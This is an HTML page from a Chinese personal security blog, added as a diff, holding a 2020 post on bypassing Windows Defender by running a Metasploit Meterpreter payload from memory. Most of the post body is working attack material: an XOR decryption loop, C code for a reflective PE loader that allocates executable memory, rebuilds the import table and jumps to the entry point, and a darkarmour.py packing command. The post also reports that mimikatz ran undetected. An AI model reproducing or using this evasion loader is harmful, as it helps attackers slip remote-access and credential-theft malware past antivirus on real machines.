@@ -1,0 +1,1415 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+  
+  
+    
+      
+    
+    
+      
+    
+  <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+  <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.min.css" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Monda:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="有人住高楼，有人在深沟，有人光万丈，有人一身锈，世人万千种，浮云莫去求，斯人若彩虹，遇上方知有。—— 文德琳・范・德拉安南 《怦然心动》  今天在国外看到的一个比较不错BypassAV的方法，遂分享给大家。​payload选择metasploits的windows/x64/meterpreter_reverse_https，测试ＡＶ为Windows Defender，比如以下面的文件为例进行测试。">
+<meta name="keywords" content="bypass,AV,360,RedTeam,WindowsDefender">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红队技巧－－通过内存中PE执行绕过AV">
+<meta property="og:url" content="https://lengjibo.github.io/bypassAV2/index.html">
+<meta property="og:site_name" content="冷逸的个人博客|开往安河桥北~">
+<meta property="og:description" content="有人住高楼，有人在深沟，有人光万丈，有人一身锈，世人万千种，浮云莫去求，斯人若彩虹，遇上方知有。—— 文德琳・范・德拉安南 《怦然心动》  今天在国外看到的一个比较不错BypassAV的方法，遂分享给大家。​payload选择metasploits的windows/x64/meterpreter_reverse_https，测试ＡＶ为Windows Defender，比如以下面的文件为例进行测试。">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gartdtgrp4j30m104pglt.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gartegvv9qj30jl08eq3p.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gartkc48o8j30fr0bewf2.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gartkr3352j31gz04m752.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gartl3oluuj30eu07tgm1.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gartlfcvkmj30ja080wf7.jpg">
+<meta property="og:updated_time" content="2020-01-10T14:11:59.428Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="红队技巧－－通过内存中PE执行绕过AV">
+<meta name="twitter:description" content="有人住高楼，有人在深沟，有人光万丈，有人一身锈，世人万千种，浮云莫去求，斯人若彩虹，遇上方知有。—— 文德琳・范・德拉安南 《怦然心动》  今天在国外看到的一个比较不错BypassAV的方法，遂分享给大家。​payload选择metasploits的windows/x64/meterpreter_reverse_https，测试ＡＶ为Windows Defender，比如以下面的文件为例进行测试。">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007F8GgBly1gartdtgrp4j30m104pglt.jpg">
+
+
+
+  <link rel="alternate" href="/../../.deploy_git/atom.xml" title="冷逸的个人博客|开往安河桥北~" type="application/atom+xml" />
+
+
+
+
+  <link rel="canonical" href="https://lengjibo.github.io/bypassAV2/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>红队技巧－－通过内存中PE执行绕过AV | 冷逸的个人博客|开往安河桥北~</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">冷逸的个人博客|开往安河桥北~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Startseite</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />Über</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Kategorien</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archiv</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-book">
+    <a href="/book/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-book"></i> <br />book</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://lengjibo.github.io/bypassAV2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="冷逸">
+      <meta itemprop="description" content="做一个温柔的人...">
+      <meta itemprop="image" content="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="冷逸的个人博客|开往安河桥北~">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">红队技巧－－通过内存中PE执行绕过AV
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+
+              
+                
+              
+
+              <time title="Post created: 2020-01-10 21:57:59 / Updated at: 22:11:59" itemprop="dateCreated datePublished" datetime="2020-01-10T21:57:59+08:00">2020-01-10</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/RedTeam/" itemprop="url" rel="index"><span itemprop="name">RedTeam</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon"
+            >
+            <i class="fa fa-eye"></i>
+             Views:  
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>有人住高楼，有人在深沟，有人光万丈，有人一身锈，世人万千种，浮云莫去求，斯人若彩虹，遇上方知有。<br>—— 文德琳・范・德拉安南 《怦然心动》</p>
+<hr>
+<p>今天在国外看到的一个比较不错BypassAV的方法，遂分享给大家。<br>​<br>payload选择metasploits的windows/x64/meterpreter_reverse_https，测试ＡＶ为Windows Defender，比如以下面的文件为例进行测试。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gartdtgrp4j30m104pglt.jpg" alt="caught_by_defender.jpg"></p>
+<a id="more"></a>
+<p>然后就会被Windows Defender检测到，并可以通过时间查看器查看</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gartegvv9qj30jl08eq3p.jpg" alt="defender_event_view.jpg"></p>
+<p>然后我们就可以发现，我们被“HackTool:Win64/Meterpreter.A!dll”所拦截。很明显我们不能在磁盘中运行恶意文件获取会话，那么我们选择以内存的方式运行文件。</p>
+<p>具体思路：</p>
+<ul>
+<li><p>加密恶意软件并将其存储在内存中</p>
+</li>
+<li><p>解析DOS标头＆</p>
+</li>
+<li><p>重新创建导入地址表</p>
+</li>
+<li><p>获取并跳转到新的入口点</p>
+</li>
+</ul>
+<p>加密方式我们选择多层的XOR，下面是对代码进行加密的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for (i = 0; i &lt; array_len; i++) &#123;</span><br><span class="line">    decrypted_bytes[i] = keys ^ image_crypt[i];</span><br><span class="line">    image_crypt[i] = &apos;\\0&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// repeat this for each key</span><br><span class="line">for (i = 0; i &lt; array_len; i++) &#123;</span><br><span class="line">    decrypted_bytes[i] = key%s ^ decrypted_bytes[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>解析DOS标头时，需要一些重要的结构</p>
+<ul>
+<li>PIMAGE_DOS_HEADER</li>
+</ul>
+<p>要检查恶意软件中的魔术字节，只需确保我们可以实际执行它即可。</p>
+<ul>
+<li>PIMAGE_NT_HEADERS</li>
+</ul>
+<p>用于检查恶意软件的PE签名（再次确保其有效），并使用该OptionalHeader值使我们能够访问IMAGE_OPTIONAL_HEADER结构</p>
+<ul>
+<li>IMAGE_OPTIONAL_HEADER</li>
+</ul>
+<p>在获取图像基本和入口点地址的同时，还要获取图像和标题的整体大小。然后，这将允许使用分配正确的内存量。</p>
+<ul>
+<li>PIMAGE_SECTION_HEADER</li>
+</ul>
+<p>允许我们访问每个部分的地址，大小和数据，以便将其复制到上面分配的空间中。</p>
+<p>下面是我们将用来完成所有这些操作的代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">AllocateImage</span><span class="params">(LPVOID base_addr)</span> </span>&#123;</span><br><span class="line">      LPVOID mem_image_base = <span class="literal">NULL</span>;</span><br><span class="line">      PIMAGE_DOS_HEADER raw_image_base = (PIMAGE_DOS_HEADER)base_addr;</span><br><span class="line">​</span><br><span class="line">      <span class="keyword">if</span> (IMAGE_DOS_SIGNATURE != raw_image_base-&gt;e_magic)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">​</span><br><span class="line">      PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)(raw_image_base-&gt;e_lfanew + (UINT_PTR)raw_image_base);</span><br><span class="line">      <span class="keyword">if</span> (IMAGE_NT_SIGNATURE != nt_header-&gt;Signature)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">​</span><br><span class="line">      PIMAGE_SECTION_HEADER section_header = (PIMAGE_SECTION_HEADER)(raw_image_base-&gt;e_lfanew + <span class="keyword">sizeof</span>(*nt_header) + (UINT_PTR)raw_image_base);</span><br><span class="line">​</span><br><span class="line">      mem_image_base = VirtualAlloc((LPVOID)(nt_header-&gt;OptionalHeader.ImageBase), nt_header-&gt;OptionalHeader.SizeOfImage , MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">​</span><br><span class="line">      <span class="keyword">if</span> (<span class="literal">NULL</span> == mem_image_base)</span><br><span class="line">      &#123;</span><br><span class="line">          mem_image_base = VirtualAlloc(<span class="literal">NULL</span>, nt_header-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">      &#125;</span><br><span class="line">​</span><br><span class="line">      <span class="keyword">if</span> (<span class="literal">NULL</span> == mem_image_base)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">​</span><br><span class="line">      <span class="built_in">memcpy</span>(mem_image_base, (LPVOID)raw_image_base, nt_header-&gt;OptionalHeader.SizeOfHeaders);</span><br><span class="line">​</span><br><span class="line">​      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nt_header-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="built_in">memcpy</span>((LPVOID)(section_header-&gt;VirtualAddress + (UINT_PTR)mem_image_base), (LPVOID)(section_header-&gt;PointerToRawData + (UINT_PTR)raw_image_base), section_header-&gt;SizeOfRawData);</span><br><span class="line">       section_header++;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> mem_image_base;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>重新创建导入地址表</p>
+<p>这次我们需要的重要结构是</p>
+<ul>
+<li>IMAGE_OPTIONAL_HEADER</li>
+</ul>
+<p>我们将使用它来获取IAT（导入地址表）的地址和大小。一旦获得地址，我们将使用它VirtualProtect来将其权限更改为，PAGE_READWRITE以便进行下一步。</p>
+<ul>
+<li>PIMAGE_IMPORT_DESCRIPTOR</li>
+</ul>
+<p>这用于访问包含导入地址表（用于查找DLL的内存地址的查询表，当调用其他库中的函数时可以使用的信息）信息的结构。我们将使用它来获取名称。恶意软件使用的DLL并使用该LoadLibraryA功能加载它们。将DLL加载到我们自己的地址空间后，我们需要遍历并使用它GetProcAddress来获取恶意软件所需功能的正确新地址，并在IAT中添加对其的引用。</p>
+<ul>
+<li>PIMAGE_THUNK_DATA</li>
+</ul>
+<p>这将为我们提供被恶意软件调用的每个函数的名称，一旦有了这些名称，我们就可以使用GetProcAddress它们从它们所在的DLL中获取地址，然后将正确的新地址添加到IAT中。</p>
+<ul>
+<li>PIMAGE_IMPORT_BY_NAME</li>
+</ul>
+<p>允许我们从地址获取函数名称</p>
+<p>然后将所有这些放在一起…</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">ReCreateIAT</span><span class="params">( PIMAGE_DOS_HEADER dos_header, PIMAGE_NT_HEADERS nt_header)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD op;</span><br><span class="line">    DWORD iat_rva;</span><br><span class="line">    SIZE_T iat_size;</span><br><span class="line">    HMODULE import_base;</span><br><span class="line">    PIMAGE_THUNK_DATA thunk;</span><br><span class="line">    PIMAGE_THUNK_DATA fixup;</span><br><span class="line">​</span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR import_table = (PIMAGE_IMPORT_DESCRIPTOR)(nt_header-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + (UINT_PTR)dos_header);</span><br><span class="line">​</span><br><span class="line">    DWORD iat_loc = (nt_header-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress) ? IMAGE_DIRECTORY_ENTRY_IAT : IMAGE_DIRECTORY_ENTRY_IMPORT;</span><br><span class="line">​</span><br><span class="line">    iat_rva = nt_header-&gt;OptionalHeader.DataDirectory[iat_loc].VirtualAddress;</span><br><span class="line">    iat_size = nt_header-&gt;OptionalHeader.DataDirectory[iat_loc].Size;</span><br><span class="line">​</span><br><span class="line">    LPVOID iat = (LPVOID)(iat_rva + (UINT_PTR)dos_header);</span><br><span class="line">    VirtualProtect(iat, iat_size, PAGE_READWRITE, &amp;op);</span><br><span class="line">    <span class="keyword">while</span> (import_table-&gt;Name) &#123;</span><br><span class="line">        import_base = LoadLibraryA((LPCSTR)(import_table-&gt;Name + (UINT_PTR)dos_header));</span><br><span class="line">        fixup = (PIMAGE_THUNK_DATA)(import_table-&gt;FirstThunk + (UINT_PTR)dos_header);</span><br><span class="line">        <span class="keyword">if</span> (import_table-&gt;OriginalFirstThunk) &#123;</span><br><span class="line">            thunk = (PIMAGE_THUNK_DATA)(import_table-&gt;OriginalFirstThunk + (UINT_PTR)dos_header);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            thunk = (PIMAGE_THUNK_DATA)(import_table-&gt;FirstThunk + (UINT_PTR)dos_header);</span><br><span class="line">        &#125;</span><br><span class="line">​</span><br><span class="line">        <span class="keyword">while</span> (thunk-&gt;u1.Function) &#123;</span><br><span class="line">            PCHAR func_name;</span><br><span class="line">            <span class="keyword">if</span> (thunk-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG64) &#123;</span><br><span class="line">                fixup-&gt;u1.Function =</span><br><span class="line">                    (UINT_PTR)GetProcAddress(import_base, (LPCSTR)(thunk-&gt;u1.Ordinal &amp; <span class="number">0xFFFF</span>));</span><br><span class="line">​</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                func_name = (PCHAR)(((PIMAGE_IMPORT_BY_NAME)(thunk-&gt;u1.AddressOfData))-&gt;Name + (UINT_PTR)dos_header);</span><br><span class="line">                fixup-&gt;u1.Function = (UINT_PTR)GetProcAddress(import_base, func_name);</span><br><span class="line">            &#125;</span><br><span class="line">            fixup++;</span><br><span class="line">            thunk++;</span><br><span class="line">        &#125;</span><br><span class="line">        import_table++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将所有PE都设置在内存中，就可以执行它了！</p>
+<p>我们可以使用AddressOfEntryPoint结构IMAGE_OPTIONAL_HEADER 的成员来获取入口点。这将为我们提供相对于图像基址的入口点，因此，为了获得正确的地址，我们需要将其添加到基址（将从其他函数返回AllocateImage）。如下所示</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LPVOID EntryPoint = (LPVOID)(nt_header-&gt;OptionalHeader.AddressOfEntryPoint + (UINT_PTR)image_base);</span><br></pre></td></tr></table></figure>
+<p>现在我们有了切入点，我们可以使用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((<span class="keyword">void</span>(*)())(EntryPoint))();</span><br></pre></td></tr></table></figure>
+<p>作者最后将所有的功能打包成了一个工具－－Darkarmour，我们可以使用该工具进行上述操作，工具地址在文末。</p>
+<p>比如执行以下操作：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./darkarmour.py -f meter.exe -j -l <span class="number">5</span> -e xor -o darkmeter.exe</span><br></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gartkc48o8j30fr0bewf2.jpg" alt="darkarmour_cropped.jpg"></p>
+<p>执行，并绕过了杀软</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gartkr3352j31gz04m752.jpg" alt="darkmeter_session_cropped.jpg"></p>
+<p>我们也尝试执行mimikatz</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gartl3oluuj30eu07tgm1.jpg" alt="mimikatz_cropped.jpg"></p>
+<p>是的，也可以运行它:)</p>
+<p>写在后面：</p>
+<p>行为分析是杀软常见的检测恶意文件的方法，但它是执行后才会被检测的，这意味着绕过它的唯一方法是更改恶意软件的实际行为。</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gartlfcvkmj30ja080wf7.jpg" alt="mimikatz_defender_error_cropped.jpg"></p>
+<p>原文地址：</p>
+<p><a href="https://blog.dylan.codes/bypassing-av-via/" target="_blank" rel="noopener">https://blog.dylan.codes/bypassing-av-via/</a></p>
+<p>工具地址：</p>
+<p><a href="https://git.dylan.codes/batman/darkarmour" target="_blank" rel="noopener">https://git.dylan.codes/batman/darkarmour</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/bypassAV2/">红队技巧－－通过内存中PE执行绕过AV</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2020年01月10日 - 21:01</p>
+  <p><span>最后更新:</span>2020年01月10日 - 22:01</p>
+  <p><span>原始链接:</span><a href="/bypassAV2/" title="红队技巧－－通过内存中PE执行绕过AV">https://lengjibo.github.io/bypassAV2/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/bypassAV2/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/bypass/" rel="tag"><i class="fa fa-tag"></i> bypass</a>
+          
+            <a href="/tags/AV/" rel="tag"><i class="fa fa-tag"></i> AV</a>
+          
+            <a href="/tags/360/" rel="tag"><i class="fa fa-tag"></i> 360</a>
+          
+            <a href="/tags/RedTeam/" rel="tag"><i class="fa fa-tag"></i> RedTeam</a>
+          
+            <a href="/tags/WindowsDefender/" rel="tag"><i class="fa fa-tag"></i> WindowsDefender</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
